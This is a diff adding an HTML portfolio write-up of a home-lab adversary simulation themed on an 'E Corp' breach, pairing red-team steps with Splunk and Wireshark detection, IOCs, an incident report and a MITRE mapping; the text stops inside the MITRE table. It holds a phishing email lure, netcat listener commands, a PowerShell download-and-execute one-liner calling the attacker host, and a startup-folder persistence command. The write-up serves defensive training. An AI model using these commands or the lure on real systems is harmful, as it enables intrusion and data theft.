@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mr. Robot Lab — Ciprian Dumitru</title>
+  <link rel="stylesheet" href="css/style.css" />
+</head>
+<body>
+
+  <nav>
+    <a class="nav-back" href="../../index.html">← Portfolio</a>
+    <span class="nav-title">Mr. Robot — Adversary Simulation Lab</span>
+    <div class="nav-badges">
+      <span class="badge badge-red">Red Team</span>
+      <span class="badge badge-blue">Blue Team</span>
+    </div>
+  </nav>
+
+  <section id="hero">
+    <p class="hero-kicker">Adversary Simulation · Full Attack Chain</p>
+    <h1 class="hero-h1">Mr. Robot —<br><em>E Corp</em> Breach Lab</h1>
+    <div class="hero-meta">
+      <div class="hero-meta-item">
+        <strong>Environment</strong>
+        <span>VirtualBox · pfSense · Kali · Windows 11 · DC</span>
+      </div>
+      <div class="hero-meta-item">
+        <strong>Attack Vector</strong>
+        <span>Spearphishing → C2 → Lateral Movement → Exfil</span>
+      </div>
+      <div class="hero-meta-item">
+        <strong>Tools</strong>
+        <span>Mythic C2 · Splunk · Wireshark · Sysmon</span>
+      </div>
+      <div class="hero-meta-item">
+        <strong>Framework</strong>
+        <span>MITRE ATT&CK</span>
+      </div>
+    </div>
+  </section>
+
+  <div class="content">
+    <div class="phase-header reveal">
+      <p class="phase-number">Overview</p>
+      <h2 class="phase-title">Lab Environment</h2>
+    </div>
+
+    <div class="split reveal">
+      <div class="split-col">
+        <div class="block">
+          <div class="block-title">Network Topology</div>
+          <p>Two isolated LANs separated by a pfSense firewall, all running inside VirtualBox. The attacker machine sits on LAN1 and has no direct access to LAN0 — all traffic passes through the firewall.</p>
+          <div class="code-block">
+            <code>LAN1 — Attacker Network  (10.0.3.1/24)
+└── Kali Linux          10.0.3.2   [Attacker]
+
+LAN0 — Target Network   (10.0.1.1/24)
+├── Domain Controller   10.0.1.3   [ECorp AD]
+└── Windows 11          10.0.1.2   [Victim]
+
+pfSense Firewall        [Network boundary]
+Home Router             [WAN / Internet]</code>
+          </div>
+        </div>
+      </div>
+      <div class="split-col">
+        <div class="block">
+          <div class="block-title">Blue Team Setup</div>
+          <p>Splunk is deployed on the victim machine (10.0.1.2) collecting local endpoint telemetry via Sysmon. Wireshark captures are taken from both pfSense and the victim machine directly to cover intra-LAN traffic blind spots.</p>
+          <div class="code-block">
+            <code>Splunk (on 10.0.1.2)
+├── Sysmon Operational logs
+├── Windows PowerShell logs
+└── Windows Event Logs
+
+Wireshark captures
+├── pfSense  → inter-LAN traffic
+└── 10.0.1.2 → intra-LAN (SMB)</code>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="phase-header reveal">
+      <p class="phase-number">Phase 01</p>
+      <h2 class="phase-title">Initial Access — Phishing Attack</h2>
+    </div>
+
+
+    <div class="split">
+      <div class="split-col split-col-red">
+        <div class="col-header">
+          <span class="col-dot col-dot-red"></span>
+          <span class="col-label col-label-red">Red Team · Attack</span>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Preparation</div>
+          <p>A PowerShell payload was crafted inside <code>Bonus1.iso</code> — the ISO contains <code>UNZIPPER.BAT</code> (the downloader) and a decoy <code>bonus.txt</code>. When the victim runs the bat file, it silently pulls <code>earnings_statement.bat</code> from the attacker's HTTP server and executes it, establishing a reverse shell on port 1337.</p>
+          <p>Before launching the attack, a Netcat listener and a Python HTTP server are staged on the attacker machine:</p>
+          <div class="code-label">Kali Linux — Terminal 1 &amp; 2</div>
+          <div class="code-block red-code">
+            <code>python3 -m http.server 8000
+nc -lvp 1337</code>
+          </div>
+            <img class="img-placeholder screenshot" src="assets/1.png" alt="Two terminals side by side — nc listener + HTTP server"/>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Phishing Email</div>
+          <p>A spearphishing email is sent to the victim impersonating the HR department of E Corp, creating urgency around an executive bonus. The ISO file is attached and the victim is instructed to run the unzipper to access the documents.</p>
+          <div class="code-block red-code">
+            <code>From:    EC0rp HR
+To:      Phillip Price
+Subject: Executive Bonus — Immediate Action Required
+
+Dear Mr. Price,
+
+We are pleased to inform you that as part of our company's
+recent success, you have been selected to receive an executive
+bonus. To ensure your bonus is processed in the next pay cycle,
+please review and confirm your details in the attachment.
+
+Please find the "unzipper" file and execute it to unzip the file.
+If the information is correct, no further action is needed.
+Please complete the confirmation by end of day.
+
+Best regards,
+HR
+
+Attachment: Bonus1.iso</code>
+          </div>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Reverse Shell Established</div>
+          <p>The victim opens the email, mounts the ISO, and executes <code>UNZIPPER.BAT</code> as instructed. The script invokes a PowerShell web request to pull <code>earnings_statement.bat</code> from the attacker's HTTP server and runs it — triggering the reverse shell connection back to Kali on port 1337.</p>
+            <img class="img-placeholder screenshot" src="assets/2.png" alt="IMG: Terminals — reverse shell received on nc + GET request for payload visible in HTTP server log"/>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Enumeration</div>
+          <p>With shell access established, basic reconnaissance is performed on the victim machine to understand the environment:</p>
+          <div class="code-block red-code">
+            <code>whoami
+ipconfig
+systeminfo
+netstat -ano</code>
+          </div>
+            <img class="img-placeholder screenshot" src="assets/3.png" alt="IMG: Reverse shell terminal — output of whoami / ipconfig / systeminfo"/>
+        </div>
+      </div>
+
+      <div class="split-col split-col-blue">
+        <div class="col-header">
+          <span class="col-dot col-dot-blue"></span>
+          <span class="col-label col-label-blue">Blue Team · Analysis</span>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Alert Triggered</div>
+          <p>A Splunk alert fires on the victim machine (10.0.1.2) — four enumeration commands (<code>whoami</code>, <code>ipconfig</code>, <code>systeminfo</code>, <code>netstat -ano</code>) executed within 60 seconds. Investigation begins.</p>
+          <p style="color:var(--accent); font-size:0.75rem;">Investigation start: 29.04.2026 — 18:58</p>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Process Creation Analysis — EventCode 1</div>
+          <div class="spl-block">
+            <div class="spl-label">Splunk SPL</div>
+            <code>source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=1
+| table _time EventCode process_name parent_process_name CommandLine</code>
+          </div>
+          <p>Sorting by <code>_time</code> ascending reveals the full execution chain:</p>
+          <div class="timeline">
+            <div class="timeline-event">
+              <span class="t-time">18:29:22.036</span>
+              <span class="t-event"><strong>pprice11 email opened</strong> by the victim in Thunderbird</span>
+            </div>
+            <div class="timeline-event">
+              <span class="t-time">18:29:22 – 18:29:23</span>
+              <span class="t-event"><strong>Bonus1.iso attachment downloaded</strong> (3 write events)</span>
+            </div>
+            <div class="timeline-event">
+              <span class="t-time">18:32:59.834</span>
+              <span class="t-event"><strong>UNZIPPER.BAT first executed</strong> by the victim</span>
+            </div>
+            <div class="timeline-event">
+              <span class="t-time">18:33:00.535</span>
+              <span class="t-event">PowerShell web request — <strong>earnings_statement.bat downloaded</strong> from attacker HTTP server to <code>\Windows\Temp\</code></span>
+            </div>
+            <div class="timeline-event">
+              <span class="t-time">18:33:01.465</span>
+              <span class="t-event"><strong>earnings_statement.bat executed</strong></span>
+            </div>
+            <div class="timeline-event">
+              <span class="t-time">18:33:01.489</span>
+              <span class="t-event"><strong>Reverse shell connection established</strong></span>
+            </div>
+            <div class="timeline-event">
+              <span class="t-time">18:37:07 – 18:38:03</span>
+              <span class="t-event"><strong>Enumeration commands</strong> executed: whoami → ipconfig → systeminfo → netstat -ano (all within 60 seconds)</span>
+            </div>
+          </div>
+            <img class="img-placeholder screenshot" src="assets/4.png" alt="IMG: Splunk — email opened event, 1 row"/>
+            <img class="img-placeholder screenshot" src="assets/5.png" alt="IMG: Splunk — UNZIPPER.BAT execution with payload code visible"/>
+            <img class="img-placeholder screenshot" src="assets/6.png" alt="IMG: Splunk — enumeration commands that triggered the alert"/>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">File Creation Analysis — EventCode 11</div>
+          <div class="spl-block">
+            <div class="spl-label">Splunk SPL</div>
+            <code>source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=1 OR EventCode=11
+| table _time EventCode file_name process_name parent_process_name CommandLine</code>
+          </div>
+          <div class="timeline">
+            <div class="timeline-event">
+              <span class="t-time">18:31:13 (×4)</span>
+              <span class="t-event"><strong>Bonus1.iso written to disk</strong> — 4 write events in rapid succession</span>
+            </div>
+            <div class="timeline-event">
+              <span class="t-time">18:33:01.428</span>
+              <span class="t-event"><strong>earnings_statement.bat written to disk</strong> in <code>\Windows\Temp\</code></span>
+            </div>
+          </div>
+            <img class="img-placeholder screenshot" src="assets/7.png" alt="IMG: Splunk — Bonus1.iso written to disk"/>
+            <img class="img-placeholder screenshot" src="assets/8.png" alt="IMG: Splunk — earnings_statement.bat file creation"/>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Network Connections — EventCode 3</div>
+          <div class="spl-block">
+            <div class="spl-label">Splunk SPL</div>
+            <code>source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=3
+| table _time EventCode host process_name dest_ip src_ip</code>
+          </div>
+          <p>Two outbound PowerShell connections detected from the victim machine to an unknown IP:</p>
+          <div class="timeline">
+            <div class="timeline-event">
+              <span class="t-time">18:33:13.773</span>
+              <span class="t-event">PowerShell → <strong>10.0.3.2</strong> (suspicious — first sighting of this IP)</span>
+            </div>
+            <div class="timeline-event">
+              <span class="t-time">18:33:14.082</span>
+              <span class="t-event">PowerShell → <strong>10.0.3.2</strong> (repeated connection)</span>
+            </div>
+          </div>
+          <p><strong style="color:var(--red)">IOC noted:</strong> 10.0.3.2 — unknown destination, flagged for further investigation.</p>
+            <img class="img-placeholder screenshot" src="assets/9.png" alt="IMG: Splunk — PowerShell outbound connections to 10.0.3.2"/>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Wireshark Analysis — pfSense Capture</div>
+          <div class="code-block blue-code">
+            <code>Filter: ip.addr == 10.0.3.2</code>
+          </div>
+          <p>The three-way handshake (SYN → SYN-ACK → ACK) between the victim (10.0.1.2) and the suspicious IP (10.0.3.2) is immediately visible, confirming an active connection was established.</p>
+            <img class="img-placeholder screenshot" src="assets/10.png" alt="IMG: Wireshark — 3-way handshake between 10.0.1.2 and 10.0.3.2"/>
+          <p>A GET request for <code>earnings_statement.txt</code> is visible — this is the payload being pulled from the attacker's HTTP server.</p>
+            <img class="img-placeholder screenshot" src="assets/11.png" alt="IMG: Wireshark — GET request for earnings_statement.txt"/>
+          <p>Following the HTTP stream reveals the reverse shell payload in plain text.</p>
+            <img class="img-placeholder screenshot" src="assets/12.png" alt="IMG: Wireshark — HTTP Stream with reverse shell payload in plain text"/>
+          <p>The subsequent TCP stream shows the enumeration commands being executed through the shell — confirming attacker interaction post-compromise.</p>
+            <img class="img-placeholder screenshot" src="assets/13.png" alt="IMG: Wireshark — TCP Stream showing enumeration commands in plain text"/>
+          <p style="color:var(--accent); font-size:0.75rem;">Investigation end: 29.04.2026 — 20:41</p>
+        </div>
+      </div>
+    </div>
+
+
+    <div class="phase-header reveal">
+      <p class="phase-number">Phase 02</p>
+      <h2 class="phase-title">C2 · Persistence · Lateral Movement · Data Exfiltration</h2>
+    </div>
+
+    <div class="split">
+      <div class="split-col split-col-red">
+        <div class="col-header">
+          <span class="col-dot col-dot-red"></span>
+          <span class="col-label col-label-red">Red Team · Attack</span>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Mythic C2 — Agent Deployment</div>
+          <p>A Mythic C2 Apollo payload is generated using an HTTP C2 profile, configured to call back to the attacker machine at 10.0.3.2. The agent is named <code>rsk.exe</code>.</p>
+          <p>The agent is delivered via the existing reverse shell using a PowerShell one-liner:</p>
+          <div class="code-label">Delivered via reverse shell</div>
+          <div class="code-block red-code">
+            <code>powershell -Command "& {
+  Invoke-WebRequest -URI http://10.0.3.2:8000/rsk.exe `
+    -OutFile C:\Windows\Temp\rsk.exe;
+  C:\Windows\Temp\rsk.exe
+}"</code>
+          </div>
+          <p>The Mythic UI confirms an active callback from the target — the C2 agent is live.</p>
+            <img class="img-placeholder screenshot" src="assets/14.png" alt="IMG: Mythic UI — active callback from target machine"/>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Persistence — Startup Folder</div>
+          <p>To ensure the C2 agent survives reboots, <code>rsk.exe</code> is copied to the Windows startup folder. Every time the machine boots, the agent calls back to the C2 server automatically.</p>
+          <div class="code-block red-code">
+            <code>powershell Copy-Item `
+  "C:\Windows\Temp\rsk.exe" `
+  "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\rsk.exe"</code>
+          </div>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Discovery — Victim File System</div>
+          <p>Navigating the victim's file system through Mythic to identify useful documents:</p>
+          <div class="code-block red-code">
+            <code>ls C:\Users\pprice\Documents</code>
+          </div>
+            <img class="img-placeholder screenshot" src="assets/15.png" alt="IMG: Mythic UI — ls results listing pprice Documents folder"/>
+          <p>A draft note is found and read — it reveals the victim has administrator privileges, which is useful context for lateral movement.</p>
+            <img class="img-placeholder screenshot" src="assets/16.png" alt="IMG: Mythic UI — cat output of the draft note revealing admin privileges"/>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Lateral Movement — ECorp Domain Controller</div>
+          <p>Domain controller enumeration is performed from within Mythic:</p>
+          <div class="code-block red-code">
+            <code>net_dclist</code>
+          </div>
+            <img class="img-placeholder screenshot" src="assets/17.png" alt="IMG: Mythic UI — net_dclist results showing ECorp-DC.ECorp.local shares"/>
+          <p>Among the available shares, <strong>SteelMountain</strong> stands out. Listing its contents reveals a confidential document.</p>
+            <img class="img-placeholder screenshot" src="assets/18.png" alt="IMG: Mythic UI — SteelMountain share listing showing Confidential Memo Backup Plan"/>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Data Exfiltration</div>
+          <p>The confidential memo is read and then exfiltrated via Mythic's download function:</p>
+            <img class="img-placeholder screenshot" src="assets/19.png" alt="IMG: Mythic UI — cat output of Confidential Memo Backup Plans.txt"/>
+            <img class="img-placeholder screenshot" src="assets/20.png" alt="IMG: Mythic UI — ACTIONS > Download on the confidential file"/>
+          <p><strong>Exfiltrated:</strong> <code>Confidential Memo Backup Plans.txt</code> from the SteelMountain share on ECorp DC (10.0.1.3).</p>
+        </div>
+      </div>
+
+      <div class="split-col split-col-blue">
+        <div class="col-header">
+          <span class="col-dot col-dot-blue"></span>
+          <span class="col-label col-label-blue">Blue Team · Analysis</span>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Alert — Executable in \Temp\</div>
+          <p>A Splunk alert fires for a new executable written to <code>\Windows\Temp\</code>. Investigation begins.</p>
+          <p style="color:var(--accent); font-size:0.75rem;">Investigation start: 01.05.2026 — 17:53</p>
+          <div class="spl-block">
+            <div class="spl-label">Splunk SPL — Alert Rule</div>
+            <code>source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=1
+| table _time Computer process_name CommandLine ParentImage
+| where like(CommandLine, "%\\Windows\\Temp\\%")</code>
+          </div>
+          <p>Results show <code>rsk.exe</code> dropped in <code>\Windows\Temp\</code> — this is the starting point of the investigation.</p>
+            <img class="img-placeholder screenshot" src="assets/21.png" alt="IMG: Splunk — alert results showing rsk.exe in Temp directory"/>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">rsk.exe — Download &amp; Execution Chain</div>
+          <div class="spl-block">
+            <div class="spl-label">Splunk SPL</div>
+            <code>source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=1 OR EventCode=11 AND rsk.exe
+| table _time EventCode file_name process_name
+         parent_process_name file_path CommandLine</code>
+          </div>
+          <p>Five events reconstruct the delivery chain:</p>
+          <div class="timeline">
+            <div class="timeline-event">
+              <span class="t-time">16:58:48.807</span>
+              <span class="t-event">PowerShell executed — <strong>rsk.exe downloaded</strong> from 10.0.3.2 on port 8000(unusual for HTTP) (same IP as Initial Access) to <code>\Windows\Temp\</code></span>
+            </div>
+            <div class="timeline-event">
+              <span class="t-time">16:58:49.636</span>
+              <span class="t-event"><strong>rsk.exe written to disk</strong> (file creation event)</span>
+            </div>
+            <div class="timeline-event">
+              <span class="t-time">16:58:51.273</span>
+              <span class="t-event"><strong>rsk.exe executed</strong> — 2 seconds after being written to disk</span>
+            </div>
+          </div>
+            <img class="img-placeholder screenshot" src="assets/22.png" alt="IMG: Splunk — 5 rows showing rsk.exe download and execution chain"/>
+            <img class="img-placeholder screenshot" src="assets/23.png" alt="IMG: Splunk — rsk.exe downloaded from 10.0.3.2"/>
+            <img class="img-placeholder screenshot" src="assets/24.png" alt="IMG: Splunk — rsk.exe file creation event"/>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">rsk.exe — Network Connections</div>
+          <div class="spl-block">
+            <div class="spl-label">Splunk SPL</div>
+            <code>source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+EventCode=3 rsk.exe
+| table _time EventCode process_name src_ip dest_ip</code>
+          </div>
+          <p>rsk.exe is making connections to two destinations:</p>
+          <div class="timeline">
+            <div class="timeline-event">
+              <span class="t-time">dest: 10.0.3.2</span>
+              <span class="t-event">Connection to known attacker IP — <strong>C2 beaconing</strong></span>
+            </div>
+            <div class="timeline-event">
+              <span class="t-time">dest: 10.0.1.3</span>
+              <span class="t-event">Connection to ECorp Domain Controller — <strong>possible lateral movement</strong></span>
+            </div>
+          </div>
+            <img class="img-placeholder screenshot" src="assets/25.png" alt="IMG: Splunk — rsk.exe network connections, 3 rows showing both destinations"/>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Wireshark — pfSense Capture</div>
+          <div class="code-block blue-code">
+            <code>Filter: ip.addr==10.0.1.2 &amp;&amp; ip.addr==10.0.3.2</code>
+          </div>
+          <p>The GET request for <code>rsk.exe</code> is visible immediately after the three-way handshake. Further down, a repeating pattern emerges:</p>
+            <img class="img-placeholder screenshot" src="assets/26.png" alt="IMG: Wireshark — initial connection and GET request for rsk.exe"/>
+          <p><strong>C2 Beaconing identified:</strong> new packets between 10.0.1.2 and 10.0.3.2 appear at intervals of 8–12 seconds. The irregular interval (jitter) is a deliberate evasion technique — random sleep between callbacks to avoid fixed-interval detection rules.</p>
+            <img class="img-placeholder screenshot" src="assets/27.png" alt="IMG: Wireshark — beaconing jitter pattern visible in timestamps"/>
+          <p>Following the HTTP stream reveals all requests and responses are <strong>Base64-encoded and additionally encrypted</strong> (likely AES). Content inspection is not possible — this is C2 traffic tunneled over HTTP to evade detection.</p>
+            <img class="img-placeholder screenshot" src="assets/28.png" alt="IMG: Wireshark — HTTP Stream showing Base64 encoded / encrypted C2 traffic"/>
+          <p style="color:var(--accent); font-size:0.75rem;">Investigation end: 01.05.2026 — 19:52</p>
+        </div>
+
+        <div class="block reveal">
+          <div class="block-title">Wireshark — Victim Machine Capture (Intra-LAN)</div>
+          <p style="color:var(--text-muted); font-size:0.75rem; margin-bottom:1rem;">Investigation start: 08.05.2026 — 20:17</p>
+          <p>A new capture is taken directly from the victim machine (10.0.1.2) to capture intra-LAN traffic that doesn't pass through pfSense.</p>
+          <div class="code-block blue-code">
+            <code>Filter: ip.src == 10.0.0.0/16 &amp;&amp; ip.dst == 10.0.0.0/16</code>
+          </div>
+          <p>The same 8–12 second beaconing pattern is immediately visible, confirming the C2 agent is still active.</p>
+             <img class="img-placeholder screenshot" src="assets/29.png" alt="IMG: Wireshark — jitter beaconing pattern from victim machine capture"/>
+          <p>Filtering for SMB traffic between the victim and the DC reveals the lateral movement and exfiltration:</p>
+          <div class="code-block blue-code">
+            <code>Filter: ip.addr==10.0.1.2 and tcp.port==445</code>
+          </div>
+          <p>A <strong>Create Request File</strong> for <code>Confidential Memo Backup Plans.txt</code> is visible — confirming the file was accessed from the SteelMountain share on the DC and exfiltrated at <strong>19:22:45.872</strong>.</p>
+            <img class="img-placeholder screenshot" src="assets/30.png" alt="IMG: Wireshark — SMB Create Request showing Confidential Memo Backup Plans.txt"/>
+          <p style="color:var(--accent); font-size:0.75rem;">Investigation end: 08.05.2026 — 20:55</p>
+        </div>
+      </div>
+    </div>
+
+
+    <div class="phase-header reveal">
+      <p class="phase-number">Findings</p>
+      <h2 class="phase-title">Indicators of Compromise</h2>
+    </div>
+
+    <div class="reveal" style="margin-bottom:5rem; overflow-x:auto;">
+      <table class="ioc-table">
+        <thead>
+          <tr>
+            <th>Indicator</th>
+            <th>Type</th>
+            <th>Source</th>
+            <th>Detection Method</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>UNZIPPER.BAT</td>
+            <td>Malicious script</td>
+            <td>Victim machine</td>
+            <td>Sysmon EventCode 1 — Splunk</td>
+          </tr>
+          <tr>
+            <td>earnings_statement.bat (.txt)</td>
+            <td>Reverse shell payload</td>
+            <td>\Windows\Temp\</td>
+            <td>Sysmon EventCode 1, 11 — Splunk</td>
+          </tr>
+          <tr>
+            <td>Bonus1.iso</td>
+            <td>Malicious attachment</td>
+            <td>Victim machine</td>
+            <td>Sysmon EventCode 11 — Splunk</td>
+          </tr>
+          <tr>
+            <td>rsk.exe</td>
+            <td>Mythic C2 Agent</td>
+            <td>\Windows\Temp\ + Startup folder</td>
+            <td>Sysmon EventCode 1, 11 — Splunk</td>
+          </tr>
+          <tr>
+            <td>10.0.3.2</td>
+            <td>Attacker IP / C2 Server</td>
+            <td>Network traffic</td>
+            <td>Sysmon EventCode 3 — Splunk / Wireshark</td>
+          </tr>
+          <tr>
+            <td>whoami, ipconfig, systeminfo, netstat — under 60s</td>
+            <td>Rapid enumeration</td>
+            <td>Victim machine</td>
+            <td>Sysmon EventCode 1 — Splunk</td>
+          </tr>
+          <tr>
+            <td>Beaconing every 8–12s with jitter</td>
+            <td>C2 network pattern</td>
+            <td>Network traffic</td>
+            <td>Wireshark — ip.addr==10.0.1.2 &amp;&amp; ip.addr==10.0.3.2</td>
+          </tr>
+          <tr>
+            <td>Base64 + encrypted HTTP traffic</td>
+            <td>Obfuscated C2 channel</td>
+            <td>Network traffic</td>
+            <td>Wireshark — Follow HTTP Stream</td>
+          </tr>
+          <tr>
+            <td>SMB Create Request — Confidential Memo Backup Plans.txt</td>
+            <td>Data exfiltration</td>
+            <td>ECorp DC (10.0.1.3)</td>
+            <td>Wireshark — ip.addr==10.0.1.2 &amp;&amp; tcp.port==445</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="report-section">
+      <p class="section-label reveal">Post-Incident</p>
+      <h2 class="section-title reveal">Incident Report</h2>
+
+      <div class="report-block reveal">
+        <h3>Executive Summary</h3>
+        <p>On April 29, 2026, a targeted spearphishing attack was launched against E Corp's internal network, resulting in the full compromise of two critical systems: the workstation of Phillip Price (10.0.1.2) and the E Corp Domain Controller (10.0.1.3). The attacker gained initial access through a malicious email attachment, established a Command & Control channel, performed internal reconnaissance, moved laterally to the Domain Controller, and exfiltrated a confidential document.</p>
+        <p>The attack was detected and investigated through endpoint telemetry via Splunk (Sysmon) and network traffic analysis via Wireshark. No evidence of ransomware deployment was found within the scope of this investigation.</p>
+        <p><strong>Prepared by:</strong> Ciprian, Cybersecurity Analyst &nbsp;·&nbsp; <strong>Classification:</strong> Confidential &nbsp;·&nbsp; <strong>Report Date:</strong> May 8, 2026</p>
+      </div>
+
+      <div class="report-block reveal">
+        <h3>Timeline of Events</h3>
+        <div class="timeline">
+          <div class="timeline-event">
+            <span class="t-time">29.04 · 18:29:22</span>
+            <span class="t-event">Victim opens phishing email (pprice11) in Thunderbird</span>
+          </div>
+          <div class="timeline-event">
+            <span class="t-time">29.04 · 18:29–18:31</span>
+            <span class="t-event"><strong>Bonus1.iso</strong> attachment downloaded and written to disk (4 write events)</span>
+          </div>
+          <div class="timeline-event">
+            <span class="t-time">29.04 · 18:32:59</span>
+            <span class="t-event"><strong>UNZIPPER.BAT</strong> executed by victim</span>
+          </div>
+          <div class="timeline-event">
+            <span class="t-time">29.04 · 18:33:00</span>
+            <span class="t-event">PowerShell web request — <strong>earnings_statement.bat</strong> downloaded from 10.0.3.2 to \Windows\Temp\</span>
+          </div>
+          <div class="timeline-event">
+            <span class="t-time">29.04 · 18:33:01</span>
+            <span class="t-event">Reverse shell established — attacker has interactive access to victim machine</span>
+          </div>
+          <div class="timeline-event">
+            <span class="t-time">29.04 · 18:37–18:38</span>
+            <span class="t-event">Attacker runs enumeration: whoami, ipconfig, systeminfo, netstat -ano (within 60s)</span>
+          </div>
+          <div class="timeline-event">
+            <span class="t-time">01.05 · 16:58:48</span>
+            <span class="t-event">Mythic C2 agent <strong>rsk.exe</strong> downloaded from 10.0.3.2 and executed — C2 beaconing begins (8–12s jitter)</span>
+          </div>
+          <div class="timeline-event">
+            <span class="t-time">01.05 · ongoing</span>
+            <span class="t-event">Encrypted HTTP C2 traffic observed — exfiltration unconfirmable via network inspection alone</span>
+          </div>
+          <div class="timeline-event">
+            <span class="t-time">08.05 · 19:22:45</span>
+            <span class="t-event">Lateral movement via SMB from 10.0.1.2 → 10.0.1.3 — <strong>Confidential Memo Backup Plans.txt</strong> accessed and exfiltrated from SteelMountain share</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="report-block reveal">
+        <h3>Affected Systems</h3>
+        <table class="ioc-table">
+          <thead>
+            <tr><th>System</th><th>IP</th><th>Role</th><th>Status</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Phillip Price Workstation</td><td>10.0.1.2</td><td>Endpoint — initial victim</td><td style="color:var(--red)">Compromised</td></tr>
+            <tr><td>ECorp Domain Controller</td><td>10.0.1.3</td><td>Active Directory / File Server</td><td style="color:var(--red)">Compromised via lateral movement</td></tr>
+            <tr><td>Attacker Machine (Kali)</td><td>10.0.3.2</td><td>C2 Server</td><td style="color:var(--accent)">Identified</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="report-block reveal">
+        <h3>Detection Gaps</h3>
+        <p><strong>Gap 1 — Encrypted C2 Traffic:</strong> The Mythic C2 agent communicated over encrypted HTTP, making payload content inspection impossible. Data exfiltration over the C2 channel could not be confirmed from a Blue Team perspective. Behavioral analysis (beaconing pattern, jitter) was the only available detection signal.</p>
+        <p><strong>Gap 2 — Intra-LAN Blind Spot:</strong> The pfSense firewall capture does not include traffic between hosts within the same LAN segment. SMB-based lateral movement between 10.0.1.2 and 10.0.1.3 was only visible when packet capture was performed directly on the endpoint. This is a significant visibility gap in the current monitoring architecture.</p>
+        <p><strong>Gap 3 — Delayed Detection:</strong> The initial compromise occurred on April 29. The C2 agent was deployed May 1. Lateral movement and exfiltration were confirmed May 8 — giving the attacker approximately 9 days of undetected access.</p>
+      </div>
+
+      <div class="report-block reveal">
+        <h3>Recommendations</h3>
+        <p><strong>Immediate:</strong></p>
+        <ul class="rec-list">
+          <li>Isolate and reimage both compromised systems (10.0.1.2 and 10.0.1.3)</li>
+          <li>Reset all Active Directory credentials — assume full domain compromise</li>
+          <li>Block 10.0.3.2 at the pfSense firewall level</li>
+          <li>Remove all identified malicious files: UNZIPPER.BAT, earnings_statement.bat, rsk.exe, Bonus1.iso</li>
+          <li>Audit SteelMountain share permissions and access logs on the DC</li>
+        </ul>
+        <p style="margin-top:1rem;"><strong>Short-term (0–30 days):</strong></p>
+        <ul class="rec-list">
+          <li>Deploy span ports or endpoint capture to eliminate the intra-LAN visibility blind spot</li>
+          <li>Create Splunk alerts for: rapid enumeration under 60s, new executables in \Windows\Temp\, outbound PowerShell connections, and beaconing patterns</li>
+          <li>Enable PowerShell Script Block Logging and Module Logging across all endpoints</li>
+          <li>Block ISO attachments and password-protected archives at the email gateway</li>
+          <li>Implement application whitelisting for \Windows\Temp\</li>
+        </ul>
+        <p style="margin-top:1rem;"><strong>Long-term (30–90 days):</strong></p>
+        <ul class="rec-list">
+          <li>Restrict SMB access between workstations and domain controllers to authorized systems only</li>
+          <li>Deploy an EDR solution for real-time host-level detection</li>
+          <li>Conduct phishing awareness training for all E Corp employees</li>
+          <li>Establish a formal Incident Response playbook</li>
+          <li>Implement TLS inspection for internal HTTP traffic to detect encrypted C2 channels</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="mitre-section">
+      <p class="section-label reveal">Framework</p>
+      <h2 class="section-title reveal">MITRE ATT&CK Mapping</h2>
+
+      <div class="reveal" style="overflow-x:auto; margin-bottom:2rem;">
+        <table class="ioc-table">
+          <thead>
+            <tr><th>Tactic</th><th>Technique</th><th>ID</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Initial Access</td><td>Phishing: Spearphishing Attachment</td><td>T1566.001</td></tr>
+            <tr><td>Execution</td><td>User Execution: Malicious File</td><td>T1204.002</td></tr>
+            <tr><td>Execution</td><td>Command and Scripting Interpreter: PowerShell</td><td>T1059.001</td></tr>
+            <tr><td>Persistence</td><td>Boot or Logon Autostart Execution: Startup Folder</td><td>T1547.001</td></tr>
+            <tr><td>Discovery</td><td>System Information Discovery</td><td>T1082</td></tr>
+            <tr><td>Discovery</td><td>Network Configuration Discovery</td><td>T1016</td></tr>
+            <tr><td>Discovery</td><td>System Network Connections Discovery</td><td>T1049</td></tr>
+            <tr><td>Discovery</td><td>Account Discovery: Domain Account</td><td>T1087.002</td></tr>
+            <tr><td>Lateral Movement</td><td>Lateral Tool Transfer</td><td>T1570</td></tr>
+            <tr><td>Lateral Movement</td><td>Remote Services: SMB/Windows Admin Shares</td><td>T1021.002</td></tr>
+            <tr><td>Command & Control</td><td>Encrypted Channel</td><td>T1573</td></tr>
+            <tr><td>Command & Control</td><td>Application Layer Protocol: Web Protocols</td><td>T1071.001</td></tr>
+            <tr><td>Exfiltration</td><td>Exfiltration Over C2 Channel</td><td>T1041</td></tr>
+          </tbody>
+        </table>
+      </div>
+
